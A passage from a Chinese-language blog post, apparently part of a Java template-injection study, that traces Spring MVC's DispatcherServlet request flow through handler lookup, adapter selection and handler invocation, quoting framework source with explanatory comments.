class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 先检查是不是 Multipart 类型的，比如上传等；如果是 Multipart 类型的，则转换为 MultipartHttpServletRequest 类型</span><br>            processedRequest = checkMultipart(request);<br>            multipartRequestParsed = (processedRequest != request);<br><br>            <span class="hljs-comment">// 获取当前请求的 Handler 执行链</span><br>            mappedHandler = getHandler(processedRequest);<br>            <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>                noHandlerFound(processedRequest, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 获取当前请求的 Handler 适配器</span><br>            <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br>            <span class="hljs-comment">// 对于 header 中 last-modified 的处理</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isGet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;GET&quot;</span>.equals(method);<br>            <span class="hljs-keyword">if</span> (isGet || <span class="hljs-string">&quot;HEAD&quot;</span>.equals(method)) &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">lastModified</span> <span class="hljs-operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 遍历所有定义的 interceptor，执行 preHandle 方法</span><br>            <span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 实际调用 Handler 的地方</span><br>            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br>            <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">// 处理成默认视图名，也就是添加前缀和后缀等</span><br>            applyDefaultViewName(processedRequest, mv);<br>            <span class="hljs-comment">// 拦截器postHandle方法进行处理</span><br>            mappedHandler.applyPostHandle(processedRequest, response, mv);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            dispatchException = ex;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>            dispatchException = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, err);<br>        &#125;<br>        <span class="hljs-comment">// 处理最后的结果，渲染之类的都在这里</span><br>        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>        triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>        triggerAfterCompletion(processedRequest, response, mappedHandler,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>            <span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>                cleanupMultipart(processedRequest);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="查找对应的-Handler-对象"><a href="#查找对应的-Handler-对象" class="headerlink" title="查找对应的 Handler 对象"></a>查找对应的 Handler 对象</h4><p><img src="/img/ssti(java)/ssti36.png"></p><p>可以看到468行调用了getHandler方法，跟进一下</p><p>该方法主要是遍历所有的 handlerMappings 进行处理，handlerMappings 是在启动的时候预先注册好的，handlerMappings 包含 RequestMappingHandlerMapping、BeanNameUrlHandlerMapping、RouterFunctionMapping、SimpleUrlHandlerMapping 以及 WelcomePageHandlerMapping，在循环中会调用 <strong>AbstractHandlerMapping 类中的 getHandler 方法</strong>来获取 Handler 执行链，若获取的 Handler 执行链不为 null，则返回当前请求的 Handler 执行链，DispatcherServlet 类的 getHandler 方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 遍历所有的 handlerMappings 进行处理，handlerMappings 是在启动的时候预先注册好的</span><br>        <span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br>            <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br>            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> handler;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在循环中，根据 <code>mapping.getHandler(request);</code>，继续往下看 <strong>AbstractHandlerMapping 类中的 getHandler 方法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 根据 request 获取 handler</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getHandlerInternal(request);<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 如果没有找到就使用默认的 handler</span><br>        handler = getDefaultHandler();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果 Handler 是 String，表明是一个 bean 名称，需要寻找对应 bean</span><br>    <span class="hljs-keyword">if</span> (handler <span class="hljs-keyword">instanceof</span> String) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">handlerName</span> <span class="hljs-operator">=</span> (String) handler;<br>        handler = obtainApplicationContext().getBean(handlerName);<br>    &#125;<br>    <span class="hljs-comment">// 封装 Handler 执行链</span><br>    <span class="hljs-keyword">return</span> getHandlerExecutionChain(handler, request);<br>&#125;<br></code></pre></td></tr></table></figure><p>AbstractHandlerMapping 类中的 getHandler 方法中首先<strong>根据 request 获取 handler</strong>，看到调用了新的<strong>getHandlerInternal</strong> 方法</p><p><img src="/img/ssti(java)/ssti37.png"></p><p>跟进一下AbstractHandlerMethodMapping 类中的 <strong>getHandlerInternal</strong> 方法，看到该方法首先获取 request 中的 url，即 <code>/path</code>，用来匹配 handler 并封装成 HandlerMethod，然后根据 handlerMethod 中的 bean 来实例化 Handler 并返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerMethod <span class="hljs-title function_">getHandlerInternal</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 获取 request 中的 url，用来匹配 handler</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> getUrlPathHelper().getLookupPathForRequest(request);<br>    request.setAttribute(LOOKUP_PATH, lookupPath);<br>    <span class="hljs-built_in">this</span>.mappingRegistry.acquireReadLock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 根据路径寻找 Handler，并封装成 HandlerMethod</span><br>        <span class="hljs-type">HandlerMethod</span> <span class="hljs-variable">handlerMethod</span> <span class="hljs-operator">=</span> lookupHandlerMethod(lookupPath, request);<br>        <span class="hljs-comment">// 根据 handlerMethod 中的 bean 来实例化 Handler，并添加进 HandlerMethod</span><br>        <span class="hljs-keyword">return</span> (handlerMethod != <span class="hljs-literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="hljs-literal">null</span>);<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-built_in">this</span>.mappingRegistry.releaseReadLock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到从request中获取了&#x2F;path</p><p><img src="/img/ssti(java)/ssti38.png"></p><p>接下来，我们看 <strong>lookupHandlerMethod</strong> 的逻辑，主要逻辑委托给了 <strong>mappingRegistry</strong> 这个成员变量来处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerMethod <span class="hljs-title function_">lookupHandlerMethod</span><span class="hljs-params">(String lookupPath, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    List&lt;Match&gt; matches = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-comment">// 通过 lookupPath 属性中查找。如果找到了，就返回对应的RequestMappingInfo</span><br>    List&lt;T&gt; directPathMatches = <span class="hljs-built_in">this</span>.mappingRegistry.getMappingsByUrl(lookupPath);<br>    <span class="hljs-keyword">if</span> (directPathMatches != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 如果匹配到了，检查其他属性是否符合要求，如请求方法，参数，header 等</span><br>        addMatchingMappings(directPathMatches, matches, request);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matches.isEmpty()) &#123;<br>        <span class="hljs-comment">// 没有直接匹配到，则遍历所有的处理方法进行通配符匹配</span><br>        addMatchingMappings(<span class="hljs-built_in">this</span>.mappingRegistry.getMappings().keySet(), matches, request);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!matches.isEmpty()) &#123;<br>        <span class="hljs-comment">// 如果方法有多个匹配，不同的通配符等，则排序选择出最合适的一个</span><br>        Comparator&lt;Match&gt; comparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MatchComparator</span>(getMappingComparator(request));<br>        matches.sort(comparator);<br>        <span class="hljs-type">Match</span> <span class="hljs-variable">bestMatch</span> <span class="hljs-operator">=</span> matches.get(<span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 如果有多个匹配的，会找到第二个最合适的进行比较</span><br>        <span class="hljs-keyword">if</span> (matches.size() &gt; <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>                logger.trace(matches.size() + <span class="hljs-string">&quot; matching mappings: &quot;</span> + matches);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (CorsUtils.isPreFlightRequest(request)) &#123;<br>                <span class="hljs-keyword">return</span> PREFLIGHT_AMBIGUOUS_MATCH;<br>            &#125;<br>            <span class="hljs-type">Match</span> <span class="hljs-variable">secondBestMatch</span> <span class="hljs-operator">=</span> matches.get(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (comparator.compare(bestMatch, secondBestMatch) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> bestMatch.handlerMethod.getMethod();<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> secondBestMatch.handlerMethod.getMethod();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>                <span class="hljs-comment">// 不能有相同的最优 Match</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                        <span class="hljs-string">&quot;Ambiguous handler methods mapped for &#x27;&quot;</span> + uri + <span class="hljs-string">&quot;&#x27;: &#123;&quot;</span> + m1 + <span class="hljs-string">&quot;, &quot;</span> + m2 + <span class="hljs-string">&quot;&#125;&quot;</span>);<br>            &#125;<br>        &#125;<br>        request.setAttribute(BEST_MATCHING_HANDLER_ATTRIBUTE, bestMatch.handlerMethod);<br>        <span class="hljs-comment">// 设置 request 参数（RequestMappingHandlerMapping 对其进行了覆写）</span><br>        handleMatch(bestMatch.mapping, lookupPath, request);<br>        <span class="hljs-comment">// 返回匹配的 url 的处理的方法</span><br>        <span class="hljs-keyword">return</span> bestMatch.handlerMethod;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 调用 RequestMappingHandlerMapping 类的 handleNoMatch 方法再匹配一次</span><br>        <span class="hljs-keyword">return</span> handleNoMatch(<span class="hljs-built_in">this</span>.mappingRegistry.getMappings().keySet(), lookupPath, request);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后通过createWithResolvedBean()方法，根据 handlerMethod 中的 bean 来实例化 Handler(找到对应控制器)</p><p>通过上面的过程，我们就获取到了 Handler。</p><p>看到动态调试时回到AbstractHandlerMapping 类中的 getHandler 方法继续执行，调用了getHandlerExecutionChain方法</p><p><img src="/img/ssti(java)/ssti39.png"></p><p>该方法是用于<strong>封装执行链</strong>，将配置的拦截器加入到执行链中去，<strong>getHandlerExecutionChain</strong> 方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandlerExecutionChain</span><span class="hljs-params">(Object handler, HttpServletRequest request)</span> &#123;<br>    <span class="hljs-comment">// 如果当前 Handler 不是执行链类型，就使用一个新的执行链实例封装起来</span><br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> (handler <span class="hljs-keyword">instanceof</span> HandlerExecutionChain ? (HandlerExecutionChain) handler : <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerExecutionChain</span>(handler));<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.urlPathHelper.getLookupPathForRequest(request, LOOKUP_PATH);<br>    <span class="hljs-comment">// 遍历拦截器，找到跟当前 url 对应的，添加进执行链中去</span><br>    <span class="hljs-keyword">for</span> (HandlerInterceptor interceptor : <span class="hljs-built_in">this</span>.adaptedInterceptors) &#123;<br>        <span class="hljs-keyword">if</span> (interceptor <span class="hljs-keyword">instanceof</span> MappedInterceptor) &#123;<br>            <span class="hljs-type">MappedInterceptor</span> <span class="hljs-variable">mappedInterceptor</span> <span class="hljs-operator">=</span> (MappedInterceptor) interceptor;<br>            <span class="hljs-keyword">if</span> (mappedInterceptor.matches(lookupPath, <span class="hljs-built_in">this</span>.pathMatcher)) &#123;<br>                chain.addInterceptor(mappedInterceptor.getInterceptor());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            chain.addInterceptor(interceptor);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> chain;<br>&#125;<br></code></pre></td></tr></table></figure><p>到此为止，我们就获取了当前请求的 Handler 执行链，接下来看下是如何获取请求的 <strong>Handler 适配器</strong>，主要依靠 <strong>DispatcherServlet 类的 getHandlerAdapter 方法</strong>，该方法就是遍历所有的 HandlerAdapter，找到和当前 Handler 匹配的就返回，在这里匹配到的为 RequestMappingHandlerAdapter。DispatcherServlet 类的 getHandlerAdapter 方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerAdapter <span class="hljs-title function_">getHandlerAdapter</span><span class="hljs-params">(Object handler)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerAdapters != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 遍历所有的 HandlerAdapter，找到和当前 Handler 匹配的就返回</span><br>        <span class="hljs-keyword">for</span> (HandlerAdapter adapter : <span class="hljs-built_in">this</span>.handlerAdapters) &#123;<br>            <span class="hljs-keyword">if</span> (adapter.supports(handler)) &#123;<br>                <span class="hljs-keyword">return</span> adapter;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(<span class="hljs-string">&quot;No adapter for handler [&quot;</span> + handler +<br>            <span class="hljs-string">&quot;]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="HandlerAdapter-执行当前的-Handler"><a href="#HandlerAdapter-执行当前的-Handler" class="headerlink" title="HandlerAdapter 执行当前的 Handler"></a>HandlerAdapter 执行当前的 Handler</h4><p>再获取完当前请求的 Handler 适配器后，接着进行<strong>缓存处理</strong>，也就是对 last-modified 的处理，然后调用 applyPreHandle 方法<strong>执行拦截器的 preHandle 方法</strong>，即遍历所有定义的 interceptor，执行 postHandle 方法，然后就到了实际执行 handle 的地方，doDispatch 方法中 handle 方法是执行当前 Handler，我们这里使用的是 RequestMappingHandlerAdapter，首先会进入 <strong>AbstractHandlerMethodAdapter 的 handle 方法</strong>：</p><p>实现执行 Controller 中 (Handler) 的方法,返回 ModelAndView 视图</p><p><img src="/img/ssti(java)/ssti40.png"></p><p>在 AbstractHandlerMethodAdapter 的 handle 方法中又调用了 <strong>RequestMappingHandlerAdapter 类的 handleInternal 方法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ModelAndView mav;<br>    checkRequest(request);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.synchronizeOnSession) &#123;<br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession(<span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">mutex</span> <span class="hljs-operator">=</span> WebUtils.getSessionMutex(session);<br>            <span class="hljs-keyword">synchronized</span> (mutex) &#123;<br>                mav = invokeHandlerMethod(request, response, handlerMethod);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            mav = invokeHandlerMethod(request, response, handlerMethod);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 执行方法，封装 ModelAndView</span><br>        mav = invokeHandlerMethod(request, response, handlerMethod);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!response.containsHeader(HEADER_CACHE_CONTROL)) &#123;<br>        <span class="hljs-keyword">if</span> (getSessionAttributesHandler(handlerMethod).hasSessionAttributes()) &#123;<br>            applyCacheSeconds(response, <span class="hljs-built_in">this</span>.cacheSecondsForSessionAttributeHandlers);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            prepareResponse(response);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> mav;<br>&#125;<br></code></pre></td></tr></table></figure><p>在执行完 handle 方法后，然后调用 applyDefaultViewName 方法<strong>组装默认视图名称</strong>，将前缀和后缀名都加上，接着调用 applyPostHandle 方法<strong>执行拦截器的 preHandle 方法</strong>，也就是遍历所有定义的 interceptor，执行 postHandle 方法</p><h4 id="封装ModelAndView对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h4><p><code>invokeHandlerMethod()</code> 方法先执行目标的 <code>HandlerMethod</code>，并返回一个 <code>ModelAndView</code> 对象。比较重要的方法在第 512 行，此处的 handlerMethod 其实是 <code>com.abc.ssti.controller.ThymeleafController#path(String)</code>，这一个方法，通过 <code>this.createInvocableHandlerMethod()</code> 方法，将其封装成 <code>ServletInvocableHandlerMethod</code> 类，并让其具有 invoke 执行能力。</p><p><img src="/img/ssti(java)/ssti41.png"></p><p>后续，给 <code>invocableMethod</code> 的各大属性赋值，在赋值完毕后 new 了一个 <code>ModelAndViewContainer</code> 对象，后续会将所有的值保存到这一个对象中。</p><p><img src="/img/ssti(java)/ssti42.png"></p><p>往下走，先调用 <code>AsyncWebRequest</code> 进行异步请求的包装，后续针对是否是异步请求，做不同的处理。继续往下走，到 524行的地方是关键点，它调用了 <code>ServletInvocableHandlerMethod.invokeAndHandle()</code> 方法，调用这个方法的作用主要是获取到了 returnValueHandlers，跟进看一下。</p><p><img src="/img/ssti(java)/ssti43.png"></p><p>在<code>ServletInvocableHandlerMethod#invokeAndHandle</code>中，做了如下操作：</p><ul><li><code>invokeForRequest</code>调用Controller后获取返回值到<code>returnValue</code>中</li><li>判断<code>returnValue</code>是否为空，如果是则继续判断<code>0RequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></li><li>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer, Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//调用Controller后获取返回值到returnValue中</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.invokeForRequest(webRequest, mavContainer, providedArgs);<br>        <span class="hljs-built_in">this</span>.setResponseStatus(webRequest);<br>        <span class="hljs-comment">//判断returnValue是否为空</span><br>        <span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//判断RequestHandled是否为True</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isRequestNotModified(webRequest) || <span class="hljs-built_in">this</span>.getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>                <span class="hljs-built_in">this</span>.disableContentCachingIfNecessary(webRequest);<br>                <span class="hljs-comment">//设置RequestHandled属性</span><br>                mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(<span class="hljs-built_in">this</span>.getResponseStatusReason())) &#123;<br>            mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        